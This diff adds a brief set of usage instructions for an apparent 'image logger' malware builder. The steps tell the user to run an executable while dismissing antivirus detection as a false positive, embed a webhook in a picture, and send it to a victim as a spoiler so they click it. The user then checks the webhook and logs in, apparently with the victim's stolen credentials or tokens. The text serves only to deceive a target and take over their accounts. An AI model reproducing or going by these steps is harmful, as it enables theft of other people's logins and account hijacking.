@@ -1,0 +1,9 @@
+1.run the .exe (its a false postive bc it changes the pic file)
+2.enter the pic you want to turn into a image logger
+make sure to put a webhook in
+3.hit the "run button" 
+4.it will be in your downloads folder 
+5.send to the person you wish to log
+6.make sure its a spolier so they click on it
+7.check your webhock 
+8. log in
